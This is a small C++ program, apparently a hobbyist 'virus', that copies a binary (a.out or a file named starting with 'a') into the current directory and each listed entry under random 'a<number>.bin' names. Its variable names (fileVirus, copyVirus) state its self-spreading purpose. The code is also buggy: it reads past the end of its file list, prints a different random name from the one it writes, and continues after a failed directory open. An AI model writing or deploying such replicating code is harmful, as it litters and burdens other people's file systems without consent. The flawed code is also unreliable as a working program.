#include <dirent.h>
#include <vector>
#include <iostream>
#include <fstream>
#include <regex>
#include <cstdlib>

using namespace std;

//variables
regex correctFile("(a)+([0-9]?)+(.*)");
// detect archives
regex itsAFile("[\\w\\d\\- ]+(\\.*)");

// prototypes
void ListDir(const string &, vector<string> &);
void writeFiles(vector<string>);

int main()
{
  vector<string> files;
  ListDir("./", files);
  writeFiles(files);

  return 0;
}

// get the directorys
void ListDir(const string &path, vector<string> &files)
{
  struct dirent *entry;
  DIR *dp;
  dp = opendir(path.c_str());

  if (dp == NULL)

    perror("opendir: Path does not exist or could not be read.");

  while ((entry = readdir(dp)))
    files.push_back(entry->d_name);

  closedir(dp);
}
// write the file
void writeFiles(vector<string> files)
{

  string file = "a.out";
  for (int i = 0; i <= files.size(); i++)
  {
    try
    {
      if (regex_match(files[i], correctFile))
        file = files[i];

      // get the directories
      if ((!regex_match(files[i], itsAFile) == 0 || files[i] == ".") && files[i] != "..")
      {

        ifstream fileVirus(file, ios::binary);
        ofstream copyVirus((files[i] + "/a" + to_string(rand()) + ".bin"), ios::binary);
        cout << files[i] + "/a" + to_string(rand()) + ".bin" << endl;
        copyVirus << fileVirus.rdbuf();
      }
    }
    catch (...)
    {
      cout << "fuck" << endl;
    }
  }
}